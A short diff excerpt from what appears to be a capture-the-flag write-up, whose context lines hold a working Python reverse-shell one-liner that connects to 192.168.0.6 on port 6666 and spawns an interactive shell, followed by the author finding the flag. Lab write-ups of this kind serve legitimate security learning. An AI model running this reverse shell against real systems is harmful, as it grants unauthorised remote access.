@@ -22,3 +22,4 @@ to catch incoming requests:
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.6",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 So then I returned to my reverse shell and I was connected. I just had to use the cd command to different folders and
 had the flag in any of them.
+
